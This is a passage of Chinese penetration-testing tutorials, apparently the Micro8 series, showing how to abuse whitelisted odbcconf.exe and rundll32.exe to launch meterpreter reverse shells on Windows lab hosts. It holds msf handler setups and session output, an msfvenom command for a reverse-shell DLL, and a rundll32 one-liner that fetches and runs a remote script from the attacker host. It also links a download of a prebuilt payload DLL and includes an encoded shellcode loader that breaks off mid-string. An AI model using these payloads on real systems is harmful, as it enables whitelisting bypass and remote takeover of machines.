        <content type="html"><![CDATA[<p><strong>注：</strong>请多喝点热水或者凉白开，可预防<strong>肾结石，通风</strong>等。<br>痛风可伴发肥胖症、高血压病、糖尿病、脂代谢紊乱等多种代谢性疾病。</p><h3 id="Odbcconf简介："><a href="#Odbcconf简介：" class="headerlink" title="Odbcconf简介："></a>Odbcconf简介：</h3><p>ODBCCONF.exe是一个命令行工具，允许配置ODBC驱动程序和数据源。</p><p>微软官方文档：<br><a href="https://docs.microsoft.com/en-us/sql/odbc/odbcconf-exe?view=sql-server-2017" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/sql/odbc/odbcconf-exe?view=sql-server-2017</a></p><p>说明：Odbcconf.exe所在路径已被系统添加PATH环境变量中，因此，Odbcconf命令可识别，需注意x86，x64位的Odbcconf调用。</p><p>Windows 2003 默认位置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">C:\WINDOWS\system32\odbcconf.exe</span><br><span class="line">C:\WINDOWS\SysWOW64\odbcconf.exe`</span><br><span class="line"></span><br><span class="line">Windows 7 默认位置：</span><br><span class="line">`C:\Windows\System32\odbcconf.exe</span><br><span class="line">C:\Windows\SysWOW64\odbcconf.exe</span><br></pre></td></tr></table></figure><p><strong>攻击机：</strong><br>192.168.1.4 Debian  </p><p><strong>靶机：</strong><br>192.168.1.119 Windows 2003<br>192.168.1.5 Windows 7</p><h3 id="配置攻击机msf："><a href="#配置攻击机msf：" class="headerlink" title="配置攻击机msf："></a>配置攻击机msf：</h3><p><strong>注：x86 payload</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(multi/handler) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (exploit/multi/handler): </span><br><span class="line"></span><br><span class="line">Name Current Setting Required Description</span><br><span class="line">‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐ </span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpreter/reverse_tcp): </span><br><span class="line"></span><br><span class="line">Name Current Setting Required Description</span><br><span class="line">‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐</span><br><span class="line">EXITFUNC process yes Exit technique (Accepted: &apos;&apos;, seh, thread, process, none)</span><br><span class="line"></span><br><span class="line">LHOST 192.168.1.4 yes The listen address (an interface may be specified)</span><br><span class="line"></span><br><span class="line">LPORT 53 yes The listen port </span><br><span class="line"></span><br><span class="line">Exploit target: </span><br><span class="line"></span><br><span class="line">Id Name</span><br><span class="line"></span><br><span class="line">‐‐ ‐‐‐‐</span><br><span class="line">0 Wildcard Target </span><br><span class="line"></span><br><span class="line">msf exploit(multi/handler) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.1.4:53</span><br></pre></td></tr></table></figure><p><img src="../do/media/ba0e4d6c7b05eef6b8bcd5a730fb0c0b.jpg" alt></p><h3 id="靶机执行：Windows-2003"><a href="#靶机执行：Windows-2003" class="headerlink" title="靶机执行：Windows 2003"></a>靶机执行：Windows 2003</h3><p><strong>注：</strong>文中为了更好的跨Windows 03–Windows 2016，Odbcconf for dll采纯C重新编写。  </p><p><img src="../do/media/df24184d409a2c0d09bbd18c511bc231.jpg" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\SysWOW64\odbcconf.exe /a &#123;regsvr C:\Micropoor_Odbcconf.dll&#125;</span><br></pre></td></tr></table></figure><p><strong>注：x64</strong> Odbcconf.exe<br><img src="../do/media/74bf5a42540b5298cffc72cfa8987743.jpg" alt>  </p><p><img src="../do/media/c8a788e729ff4969f70affe596b8f3a5.jpg" alt></p><h3 id="附："><a href="#附：" class="headerlink" title="附："></a>附：</h3><p>Micropoor_Odbcconf.dll，已测Windows 2003 x64 Windows 7 x64</p><p><strong>注：</strong><br>功能：reverse_tcp IP:192.168.1.4 PORT:53。如有安全软件拦截，因Micropoor加入特征。</p><blockquote><p>  大小: 73216 字节<br>  修改时间: 2019年1月19日, 21:29:11<br>  MD5: B31B971F01DE32EC5EC45746BF3DDAD2<br>  SHA1: CF42E4BF5A613992B7A563A522BBEBF1D0F06CCE CRC32: 28A1CE90</p></blockquote><p><a href="https://drive.google.com/open?id=1j12W7VOhv_-NdnZpFhWLwdt8sQwxdAsk" target="_blank" rel="noopener">https://drive.google.com/open?id=1j12W7VOhv_-NdnZpFhWLwdt8sQwxdAsk</a></p><blockquote><p>  Micropoor</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Micro8 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>81、基于白名单Rundll32.exe执行payload第十一季</title>
      <link href="/article/81_%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Rundll32.exe%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E5%8D%81%E4%B8%80%E5%AD%A3.html"/>
      <url>/article/81_%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Rundll32.exe%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E5%8D%81%E4%B8%80%E5%AD%A3.html</url>
      
        <content type="html"><![CDATA[<p><strong>注：</strong>请多喝点热水或者凉白开，可预防<strong>肾结石，通风</strong>等。</p><h3 id="Rundll32简介："><a href="#Rundll32简介：" class="headerlink" title="Rundll32简介："></a>Rundll32简介：</h3><p>Rundll32.exe是指“执行32位的DLL文件”。它的作用是执行DLL文件中的内部函数,功能就是以命令行的方式调用动态链接程序库。</p><p><strong>说明：</strong>Rundll32.exe所在路径已被系统添加PATH环境变量中，因此，Wmic命令可识别，需注意x86，x64位的Rundll32调用。</p><p>Windows 2003 默认位置：   </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\rundll32.exe</span><br><span class="line">C:\Windows\SysWOW64\rundll32.exe</span><br></pre></td></tr></table></figure><p>Windows 7 默认位置：  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\rundll32.exe</span><br><span class="line">C:\Windows\SysWOW64\rundll32.exe</span><br></pre></td></tr></table></figure><p><strong>攻击机：</strong><br>192.168.1.4 Debian<br><strong>靶机：</strong><br>192.168.1.119 Windows 2003<br>192.168.1.5 Windows 7</p><h3 id="基于远程加载（1）："><a href="#基于远程加载（1）：" class="headerlink" title="基于远程加载（1）："></a>基于远程加载（1）：</h3><p><strong>配置攻击机msf：</strong><br><strong>注：x86 payload</strong>  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(multi/handler) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (exploit/multi/handler):</span><br><span class="line"></span><br><span class="line">Name Current Setting Required Description</span><br><span class="line">‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐ </span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpreter/reverse_tcp): </span><br><span class="line"></span><br><span class="line">Name Current Setting Required Description</span><br><span class="line">‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐</span><br><span class="line">EXITFUNC process yes Exit technique (Accepted: &apos;&apos;, seh, thread, process, none)</span><br><span class="line"></span><br><span class="line">LHOST 192.168.1.4 yes The listen address (an interface may be specified)</span><br><span class="line"></span><br><span class="line">LPORT 53 yes The listen port </span><br><span class="line"></span><br><span class="line">Exploit target: </span><br><span class="line"></span><br><span class="line">Id Name</span><br><span class="line">‐‐ ‐‐‐‐</span><br><span class="line">0 Wildcard Target </span><br><span class="line"></span><br><span class="line">msf exploit(multi/handler) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.1.4:53</span><br></pre></td></tr></table></figure><p><img src="../do/media/f92cb9f3191ab217bf1444fd4879dfc9.jpg" alt></p><h3 id="靶机执行："><a href="#靶机执行：" class="headerlink" title="靶机执行："></a>靶机执行：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\SysWOW64\rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication&quot;;document.write();GetObject(&quot;script:http://192.168.1.4/Rundll32_shellcode&quot;)</span><br></pre></td></tr></table></figure><p><strong>注：x64 rundll32.exe</strong><br><img src="../do/media/c506997b4426c859d3a558df523e9e78.jpg" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(multi/handler) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.1.4:53</span><br><span class="line">[*] Sending stage (179779 bytes) to 192.168.1.5</span><br><span class="line">[*] Meterpreter session 57 opened (192.168.1.4:53 ‐&gt; 192.168.1.5:41274)</span><br><span class="line">at 2019‐01‐19 04:13:26 ‐0500</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: John‐PC\John</span><br><span class="line">meterpreter &gt; getpid</span><br><span class="line">Current pid: 7064</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure><p><img src="../do/media/ef9be408db8b488f46d82a0be95be4d9.jpg" alt></p><h3 id="基于本地加载（2）："><a href="#基于本地加载（2）：" class="headerlink" title="基于本地加载（2）："></a>基于本地加载（2）：</h3><p><strong>payload配置：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom ‐a x86 ‐‐platform windows ‐p windows/meterpreter/reverse_tcp LHOST=192.168.1.4 LPORT=53 ‐f dll &gt; Micropoor_Rundll32.dll</span><br></pre></td></tr></table></figure><p><img src="../do/media/c29bcb8da0b2ab93b41b78680cdf6797.jpg" alt></p><p><strong>靶机执行：</strong><br><img src="../do/media/775af2d953be8cd89beb670c8103727d.jpg" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(multi/handler) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.1.4:53</span><br><span class="line">[*] Sending stage (179779 bytes) to 192.168.1.5</span><br><span class="line">[*] Meterpreter session 63 opened (192.168.1.4:53 ‐&gt; 192.168.1.5:43320)</span><br><span class="line">at 2019‐01‐19 04:34:59 ‐0500</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: John‐PC\John</span><br><span class="line">meterpreter &gt; getpid</span><br><span class="line">Current pid: 6656</span><br></pre></td></tr></table></figure><p><img src="../do/media/2bc648b8817fe93f2247fcc8ad6087e5.jpg" alt></p><h3 id="基于命令执行（3）："><a href="#基于命令执行（3）：" class="headerlink" title="基于命令执行（3）："></a>基于命令执行（3）：</h3><p><strong>靶机执行：</strong>  </p><p><strong>Windows 2003：</strong>  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe javascript:&quot;\..\mshtml.dll,RunHTMLApplication &quot;;eval(&quot;w=new ActiveXObject(\&quot;WScript.Shell\&quot;);w.run(\&quot;mstsc\&quot;);window.close()&quot;);</span><br></pre></td></tr></table></figure><p>注：如靶机支持powershell，调用powershell更贴合实战。  </p><p><img src="../do/media/8ff4ead4654c4b472ba81c84ce4cd680.jpg" alt></p><h3 id="附录：Rundll32-shellcode"><a href="#附录：Rundll32-shellcode" class="headerlink" title="附录：Rundll32_shellcode"></a>附录：Rundll32_shellcode</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt; </span><br><span class="line">&lt;package&gt;</span><br><span class="line">&lt;component id=&quot;Micropoor&quot;&gt; </span><br><span class="line"></span><br><span class="line">&lt;script language=&quot;JScript&quot;&gt;</span><br><span class="line">&lt;![CDATA[</span><br><span class="line">function setversion() &#123;</span><br><span class="line">&#125;</span><br><span class="line">function debug(s) &#123;&#125;</span><br><span class="line">function base64ToStream(b) &#123;</span><br><span class="line">var enc = new ActiveXObject(&quot;System.Text.ASCIIEncoding&quot;);</span><br><span class="line">var length = enc.GetByteCount_2(b);</span><br><span class="line">var ba = enc.GetBytes_4(b);</span><br><span class="line">var transform = new ActiveXObject(&quot;System.Security.Cryptography.FromBase64Transform&quot;);</span><br><span class="line">ba = transform.TransformFinalBlock(ba, 0, length);</span><br><span class="line">var ms = new ActiveXObject(&quot;System.IO.MemoryStream&quot;);</span><br><span class="line">ms.Write(ba, 0, (length / 4) * 3);</span><br><span class="line">ms.Position = 0;</span><br><span class="line">return ms;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">var serialized_obj = &quot;AAEAAAD/////AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVy&quot;+</span><br><span class="line">&quot;AwAAAAhEZWxlZ2F0ZQd0YXJnZXQwB21ldGhvZDADAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXph&quot;+</span><br><span class="line">&quot;dGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5IlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xk&quot;+</span><br><span class="line">&quot;ZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJAgAAAAkD&quot;+</span><br><span class="line">&quot;AAAACQQAAAAEAgAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRl&quot;+</span><br><span class="line">&quot;RW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRU&quot;+</span><br><span class="line">&quot;eXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNl&quot;+</span><br><span class="line">&quot;cmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQYFAAAAL1N5c3RlbS5SdW50aW1lLlJlbW90&quot;+</span><br><span class="line">&quot;aW5nLk1lc3NhZ2luZy5IZWFkZXJIYW5kbGVyBgYAAABLbXNjb3JsaWIsIFZlcnNpb249Mi4wLjAu&quot;+</span><br><span class="line">&quot;MCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BgcAAAAH&quot;+</span><br><span class="line">&quot;dGFyZ2V0MAkGAAAABgkAAAAPU3lzdGVtLkRlbGVnYXRlBgoAAAANRHluYW1pY0ludm9rZQoEAwAA&quot;+</span><br><span class="line">&quot;ACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0ZQd0YXJnZXQw&quot;+</span><br><span class="line">&quot;B21ldGhvZDADBwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVu&quot;+</span><br><span class="line">&quot;dHJ5Ai9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkLAAAA&quot;+</span><br><span class="line">&quot;CQwAAAAJDQAAAAQEAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9u&quot;+</span><br><span class="line">&quot;SG9sZGVyBgAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlCk1lbWJlclR5&quot;+</span><br><span class="line">&quot;cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEAAwgNU3lzdGVtLlR5cGVbXQkKAAAACQYAAAAJCQAAAAYR&quot;+</span><br><span class="line">&quot;AAAALFN5c3RlbS5PYmplY3QgRHluYW1pY0ludm9rZShTeXN0ZW0uT2JqZWN0W10pCAAAAAoBCwAA&quot;+</span><br><span class="line">&quot;AAIAAAAGEgAAACBTeXN0ZW0uWG1sLlNjaGVtYS5YbWxWYWx1ZUdldHRlcgYTAAAATVN5c3RlbS5Y&quot;+</span><br><span class="line">&quot;bWwsIFZlcnNpb249Mi4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdh&quot;+</span><br><span class="line">&quot;NWM1NjE5MzRlMDg5BhQAAAAHdGFyZ2V0MAkGAAAABhYAAAAaU3lzdGVtLlJlZmxlY3Rpb24uQXNz&quot;+</span><br><span class="line">&quot;ZW1ibHkGFwAAAARMb2FkCg8MAAAAABQAAAJNWpAAAwAAAAQAAAD//wAAuAAAAAAAAABAAAAAAAAA&quot;+</span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAADh+6DgC0Cc0huAFMzSFUaGlzIHByb2dy&quot;+</span><br><span class="line">&quot;YW0gY2Fubm90IGJlIHJ1biBpbiBET1MgbW9kZS4NDQokAAAAAAAAAFBFAABMAQMAVC1CXAAAAAAA&quot;+</span><br><span class="line">&quot;AAAA4AACIQsBCwAADAAAAAYAAAAAAAAOKgAAACAAAABAAAAAAAAQACAAAAACAAAEAAAAAAAAAAQA&quot;+</span><br><span class="line">&quot;AAAAAAAAAIAAAAACAAAAAAAAAwBAhQAAEAAAEAAAAAAQAAAQAAAAAAAAEAAAAAAAAAAAAAAAwCkA&quot;+</span><br><span class="line">&quot;AEsAAAAAQAAA0AIAAAAAAAAAAAAAAAAAAAAAAAAAYAAADAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+</span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAIAAAAAAAAAAAAAAAIIAAASAAAAAAAAAAA&quot;+</span><br><span class="line">&quot;AAAALnRleHQAAAAUCgAAACAAAAAMAAAAAgAAAAAAAAAAAAAAAAAAIAAAYC5yc3JjAAAA0AIAAABA&quot;+</span><br><span class="line">&quot;AAAABAAAAA4AAAAAAAAAAAAAAAAAAEAAAEAucmVsb2MAAAwAAAAAYAAAAAIAAAASAAAAAAAAAAAA&quot;+</span><br><span class="line">&quot;AAAAAABAAABCAAAAAAAAAAAAAAAAAAAAAPApAAAAAAAASAAAAAIABQBEIgAAfAcAAAMAAAAAAAAA&quot;+</span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQgIoBAAACgAA&quot;+</span><br><span class="line">&quot;KAIAAAYAACoAAAAAAAAA/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH&quot;+</span><br><span class="line">&quot;4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiL&quot;+</span><br><span class="line">&quot;WCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1oMzIAAGh3czJfVGhMdyYHiej/&quot;+</span><br><span class="line">&quot;0LiQAQAAKcRUUGgpgGsA/9VqCmjAqAEEaAIAADWJ5lBQUFBAUEBQaOoP3+D/1ZdqEFZXaJmldGH/&quot;+</span><br><span class="line">&quot;1YXAdAr/Tgh17OhnAAAAagBqBFZXaALZyF//1YP4AH42izZqQGgAEAAAVmoAaFikU+X/1ZNTagBW&quot;+</span><br><span class="line">&quot;U1doAtnIX//Vg/gAfShYaABAAABqAFBoCy8PMP/VV2h1bk1h/9VeXv8MJA+FcP///+mb////AcMp&quot;+</span><br><span class="line">&quot;xnXBw7vwtaJWagBT/9UAAAATMAYAZQAAAAEAABEAIFUBAACNBgAAASXQAwAABCgGAAAKC</span><br><span class="line">hYGjml+&quot;+&quot;AQAABH4CAAAEKAMAAAYLBhYHbigHAAAKBo5pKAgAAAoAfgkAAAoMFg1+CQAAChMEFhYHEQQWEgMo&quot;+</span><br><span class="line">&quot;BAAABgwIFSgFAAAGJisAKkogABAAAIABAAAEH0CAAgAABCpCU0pCAQABAAAAAAAMAAAAdjQuMC4z&quot;+</span><br><span class="line">&quot;MDMxOQAAAAAFAGwAAABgAgAAI34AAMwCAABkAwAAI1N0cmluZ3MAAAAAMAYAAAgAAAAjVVMAOAYA&quot;+</span><br><span class="line">&quot;ABAAAAAjR1VJRAAAAEgGAAA0AQAAI0Jsb2IAAAAAAAAAAgAAAVfVAjQJAgAAAPolMwAWAAABAAAA&quot;+</span><br><span class="line">&quot;DwAAAAQAAAADAAAABgAAAAwAAAALAAAABAAAAAEAAAABAAAAAQAAAAEAAAADAAAAAQAAAAEAAAAB&quot;+</span><br><span class="line">&quot;AAAAAQAAAAAACgABAAAAAAAGAEsARAAGAFsBPwEGAHcBPwEGAKYBhgEGAMYBhgEGAPcBRAAGAEEC&quot;+</span><br><span class="line">&quot;hgEGAFwCRAAGAJgChgEGAKcCRAAGAK0CRAAGANACRAAGAAID4wIGABQD4wIGAEcDNwMAAAAAAQAA&quot;+</span><br><span class="line">&quot;AAAAAQABAAEAEAAhACkABQABAAEAAAAAAPwBAAAFAAMABwATAQAAZgIAACEABAAHABEAXQASABEA&quot;+</span><br><span class="line">&quot;aAASABMBhAI+AFAgAAAAAIYYUgAKAAEAwCEAAAAAkQBYAA4AAQAAAAAAgACRIH8AFQABAAAAAACA&quot;+</span><br><span class="line">&quot;AJEgjAAdAAUAAAAAAIAAkSCZACgACwAxIgAAAACRGDADDgANAAAAAQCtAAAAAgC5AAAAAwC+AAAA&quot;+</span><br><span class="line">&quot;BADPAAAAAQDZAAAAAgDsAAAAAwD4AAAABAAHAQAABQANAQAABgAdAQAAAQAoAQAAAgAwAREAUgAu&quot;+</span><br><span class="line">&quot;ACEAUgA0ACkAUgAKAAkAUgAKADkAUgAKAEkAwAJCAGEA1wJKAGkACgNPAGEADwNYAHEAUgBkAHkA&quot;+</span><br><span class="line">&quot;UgAKACcAWwA5AC4AEwBpAC4AGwByAGMAKwA5AAgABgCRAAEAVQEAAAQAWwAnAwABBwB/AAEAAAEJ&quot;+</span><br><span class="line">&quot;AIwAAQAAAQsAmQABAGggAAADAASAAAAAAAAAAAAAAAAAAAAAAOQBAAAEAAAAAAAAAAAAAAABADsA&quot;+</span><br><span class="line">&quot;AAAAAAQAAwAAAAA8TW9kdWxlPgB3bWlfY3NfZGxsX3BheWxvYWQuZGxsAFByb2dyYW0AU2hlbGxD&quot;+</span><br><span class="line">&quot;b2RlTGF1bmNoZXIAbXNjb3JsaWIAU3lzdGVtAE9iamVjdAAuY3RvcgBNYWluAE1FTV9DT01NSVQA&quot;+</span><br><span class="line">&quot;UEFHRV9FWEVDVVRFX1JFQURXUklURQBWaXJ0dWFsQWxsb2MAQ3JlYXRlVGhyZWFkAFdhaXRGb3JT&quot;+</span><br><span class="line">&quot;aW5nbGVPYmplY3QAbHBTdGFydEFkZHIAc2l6ZQBmbEFsbG9jYXRpb25UeXBlAGZsUHJvdGVjdABs&quot;+</span><br><span class="line">&quot;cFRocmVhZEF0dHJpYnV0ZXMAZHdTdGFja1NpemUAbHBTdGFydEFkZHJlc3MAcGFyYW0AZHdDcmVh&quot;+</span><br><span class="line">&quot;dGlvbkZsYWdzAGxwVGhyZWFkSWQAaEhhbmRsZQBkd01pbGxpc2Vjb25kcwBTeXN0ZW0uU2VjdXJp&quot;+</span><br><span class="line">&quot;dHkuUGVybWlzc2lvbnMAU2VjdXJpdHlQZXJtaXNzaW9uQXR0cmlidXRlAFNlY3VyaXR5QWN0aW9u&quot;+</span><br><span class="line">&quot;AFN5c3RlbS5SdW50aW1lLkNvbXBpbGVyU2VydmljZXMAQ29tcGlsYXRpb25SZWxheGF0aW9uc0F0&quot;+</span><br><span class="line">&quot;dHJpYnV0ZQBSdW50aW1lQ29tcGF0aWJpbGl0eUF0dHJpYnV0ZQB3bWlfY3NfZGxsX3BheWxvYWQA&quot;+</span><br><span class="line">&quot;Qnl0ZQA8UHJpdmF0ZUltcGxlbWVudGF0aW9uRGV0YWlscz57MEQxQTVERjAtRDZCNy00RUUzLUJB&quot;+</span><br><span 